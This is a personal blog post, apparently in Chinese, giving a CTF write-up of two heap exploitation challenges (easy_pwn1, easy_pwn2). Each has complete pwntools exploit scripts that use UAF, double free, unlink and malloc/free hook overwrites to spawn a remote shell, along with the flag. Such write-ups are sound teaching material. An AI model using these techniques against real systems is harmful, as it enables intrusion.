@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        网络内生安全试验场CTF答题夺旗赛（第一季） - 萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+     你若盛开，清风自来！ 
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            萝卜
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pwn1"><span class="toc-text">easy_pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-pwn2"><span class="toc-text">easy_pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        网络内生安全试验场CTF答题夺旗赛（第一季）
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-09-15 16:41:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="easy-pwn1"><a href="#easy-pwn1" class="headerlink" title="easy_pwn1"></a>easy_pwn1</h2><p>话说这道题由于我知识缺陷让我做了7个小时，很头大</p>
+<p><img src="https://s2.ax1x.com/2019/09/15/ngyMLQ.md.jpg" alt><br>典型的菜单题，</p>
+<p>有5个功能<br><img src="https://s2.ax1x.com/2019/09/15/ngcVv8.jpg" alt></p>
+<p>先看create  ，一共可以创建63个Life，，每创建一个会malloc两个chunk，一个用来存放life信息，另一个来存放life的名字，而且这个chunk的大小没有限制<br><img src="https://s2.ax1x.com/2019/09/15/ngfEnK.md.jpg" alt><br>Display里面是把所有标志位==1的life都put出来<br><img src="https://s2.ax1x.com/2019/09/15/ng5hgs.md.jpg" alt><br><img src="https://s2.ax1x.com/2019/09/15/ng5TbV.jpg" alt><br>delete里面是把life_name的chunk给free掉，标志位置为0，<br><img src="https://s2.ax1x.com/2019/09/15/ng5zK1.jpg" alt><br>Destroy里面是把所有的life的chunk都free掉，</p>
+<p>漏洞点就在delete中，存在UAF漏洞</p>
+<p>首先是泄露libc地址</p>
+<p>我是先利用double free在stdout@@GLIBC_2_2_5上方伪造一个chunk，从而可以导致泄露stdout的地址，</p>
+<p>然后发尝试double free来覆盖<strong>free_hook，但是在</strong>free_hook附近找不到合适的地址，然后我尝试利用IO_FILE结构体来getshell，最后发现IO_FILE结构体的地址没有可写权限，</p>
+<p>然后只有覆盖<strong>malloc_hook函数了，在</strong>malloc_hook附近可以找到合适的地址伪造chunk，把<strong>malloc_hook地址处覆盖成ONE_gg的地址，然后我想着直接调用选项一,，然后就可以触发执行one_gg了，然而并不能，出现错误，打不开shell<br><img src="https://s2.ax1x.com/2019/09/15/ngIeKI.jpg" alt><br>然后我在</strong>malloc_hook写上realloc的地址，在_realloc_hook上写上one_gg，再调用选项一，然后还是不能打开shell<br><img src="https://s2.ax1x.com/2019/09/15/ngI3GQ.jpg" alt><br>于是我们很纳闷了，google一番，找到了一个和这题相似的2018QWB中的raisepig，<a href="https://blog.csdn.net/weixin_33978016/article/details/93784781" target="_blank" rel="noopener">强网杯pwn</a>在这一篇WP上写到<br><img src="https://s2.ax1x.com/2019/09/15/ngIBiF.md.jpg" alt><br>覆盖成功以后利用doublefree来触发程序执行__malloc_hook，</p>
+<p>然后我试着，竟然真的成功了，mmp，让我搞了7个小时，就因为一个知识点我不知道，真吃亏，长记性</p>
+<p>Exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">file_name = <span class="string">'./pwn1'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'39.106.94.18'</span></span><br><span class="line">prot = <span class="string">'32769'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = process(file_name)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(ip,int(prot))</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">file = ELF(file_name)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':'</span>+hex(x))</span><br><span class="line">ri = <span class="keyword">lambda</span>  : r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(chunk_size,value,level)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Length of the name :'</span>)</span><br><span class="line">    sl(str(chunk_size))</span><br><span class="line">    ru(<span class="string">'The name of this life :'</span>)</span><br><span class="line">    sl(value)</span><br><span class="line">    ru(<span class="string">"The level of this life (High/Low) :"</span>)</span><br><span class="line">    sl(level)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'Which life do you want to remove: '</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_all</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(r,<span class="string">"b* 0x000000000400A52"</span>)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">"\x11"</span>*<span class="number">0x20</span>,<span class="string">"High"</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">"\x22"</span>*<span class="number">0x20</span>,<span class="string">"High"</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">"\x22"</span>*<span class="number">0x20</span>,<span class="string">"High"</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete_all()</span><br><span class="line">free_got = file.got[<span class="string">'free'</span>]</span><br><span class="line"><span class="comment"># create(0x30,p64(free_got),"High")</span></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">"\x11"</span>,<span class="string">"High"</span>)</span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0x602092</span><span class="number">-8</span>),<span class="string">"High"</span>)</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">""</span>,<span class="string">"High"</span>)</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">""</span>,<span class="string">"High"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Your choice : '</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'Length of the name :'</span>)</span><br><span class="line">sl(str(<span class="number">0x30</span>))</span><br><span class="line">ru(<span class="string">'The name of this life :'</span>)</span><br><span class="line">sd(<span class="string">"aaaaaaaaaa"</span>+<span class="string">"a"</span>*<span class="number">28</span>)</span><br><span class="line">ru(<span class="string">"The level of this life (High/Low) :"</span>)</span><br><span class="line">sl(<span class="string">"High"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">rud(<span class="string">"aaaaaaaaaa"</span>+<span class="string">"a"</span>*<span class="number">28</span>)</span><br><span class="line">addr = u64(r.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">free_sym = libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">libc_base =addr- <span class="number">0x3c5620</span></span><br><span class="line">li(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">malloc_hook_addr = libc.symbols[<span class="string">'__malloc_hook'</span>]+libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_addr_1 = <span class="number">0x601f92</span><span class="number">-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create(0x30,p64(fake_addr_1),"High")</span></span><br><span class="line"><span class="comment"># create(0x30,"","High")</span></span><br><span class="line"><span class="comment"># create(0x30,"","High")</span></span><br><span class="line"><span class="comment"># create(0x30,"\x55"*8,"High")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">""</span>,<span class="string">"High"</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">""</span>,<span class="string">"High"</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">""</span>,<span class="string">"High"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_addr = malloc_hook_addr<span class="number">-0x1b</span></span><br><span class="line">create(<span class="number">0x60</span>,p64(fake_chunk_addr<span class="number">-8</span>),<span class="string">"High"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">""</span>,<span class="string">"High"</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">""</span>,<span class="string">"High"</span>)</span><br><span class="line">one_gg = <span class="number">0xf02a4</span>+libc_base</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]+libc_base</span><br><span class="line">li(<span class="string">"malloc_hook_addr"</span>,malloc_hook_addr)</span><br><span class="line">li(<span class="string">"system"</span>,system)</span><br><span class="line">li(<span class="string">"one_gg"</span>,one_gg)</span><br><span class="line">li(<span class="string">"fake_chunk_addr-8"</span>,fake_chunk_addr<span class="number">-8</span>)</span><br><span class="line">realloc_addr = libc_base+libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">li(<span class="string">"realloc_addr"</span>,realloc_addr)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">"aaaabbbbbbb"</span>+<span class="string">"aaaaaaaa"</span>+p64(one_gg),<span class="string">"High"</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">ri()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="easy-pwn2"><a href="#easy-pwn2" class="headerlink" title="easy_pwn2"></a>easy_pwn2</h2><p>这个题解的时候还算顺利<br><img src="https://s2.ax1x.com/2019/09/15/ng7kPU.jpg" alt><br>还是一个堆题，通过审计代码发现在record中存在0x100字节的写入，而且无限制的，就导致堆溢出<br>然后利用unlink attack来控制buf，然后泄露libc，覆盖__free_hook为one_gg，然后getshell</p>
+<p>Exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">file_name = <span class="string">'./pwn2'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'39.106.94.18'</span></span><br><span class="line">prot = <span class="string">'32768'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = process(file_name)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(ip,int(prot))</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">file = ELF(file_name)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':'</span>+hex(x))</span><br><span class="line">ri = <span class="keyword">lambda</span>  : r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(chunk_size)</span>:</span></span><br><span class="line">    ru(<span class="string">'your choice :\n'</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'please input the size :\n'</span>)</span><br><span class="line">    sl(str(chunk_size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">'your choice :\n'</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'delete which ?\n'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">'your choice :\n'</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'show which ?\n'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,value)</span>:</span></span><br><span class="line">    ru(<span class="string">'your choice :\n'</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'record which?\n'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">'content?\n'</span>)</span><br><span class="line">    sl(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">target_addr=<span class="number">0x0000000006020C0</span></span><br><span class="line">fd=target_addr - <span class="number">0x18</span></span><br><span class="line">bk=target_addr - <span class="number">0x10</span></span><br><span class="line">fake_chunk=<span class="string">'a'</span>*<span class="number">0x8</span> <span class="comment"># prev_size</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0x31</span>) <span class="comment"># size</span></span><br><span class="line">fake_chunk+=p64(fd)+p64(bk)</span><br><span class="line">fake_chunk+=<span class="string">'a'</span>* <span class="number">0x10</span><span class="comment">#padding</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line">create(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,fake_chunk)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">free_got = file.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">fake_heaplist = <span class="string">"\x00"</span>*<span class="number">0x18</span>+p64(<span class="number">0x6020c0</span>)+p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,fake_heaplist)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">rud(<span class="string">"\x0a"</span>)</span><br><span class="line">free_addr = u64(rud(<span class="string">"\x0a"</span>)+<span class="string">"\x00\x00"</span>)</span><br><span class="line">li(<span class="string">"free_addr"</span>,free_addr)</span><br><span class="line">libc_base = free_addr-libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">li(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">system = libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook = libc_base+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6020c0</span>)+p64(free_hook))</span><br><span class="line"><span class="comment"># delete(3)</span></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">ri()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#Flag：flag&#123;p3n_1s_interesting~&#125;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这场比赛有点遗憾，最后一天的题没做出来一个，很自闭</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
